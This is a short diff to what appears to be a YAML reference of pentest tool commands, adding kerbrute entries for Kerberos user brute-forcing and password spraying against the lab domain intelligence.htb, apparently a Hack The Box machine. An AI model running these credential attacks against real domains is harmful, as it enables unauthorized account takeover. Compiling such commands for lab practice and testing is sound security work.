@@ -22,6 +22,15 @@ functions:
 
         NOTE: USE THE LASTEST FROM SOURCE
 
+  gain-access:
+    - description: Kerberos User Bruteforce
+      code: |
+        kerbrute bruteuser -d intelligence.htb --dc intelligence.htb /usr/share/seclists/Passwords/darkweb2017-top1000.txt jose.williams
+
+    - description: Kerberos Password Spraying
+      code: |
+        kerbrute passwordspray -d intelligence.htb --dc intelligence.htb ../creators thisismypassword
+
 
 resources: |
   https://github.com/ropnop/kerbrute
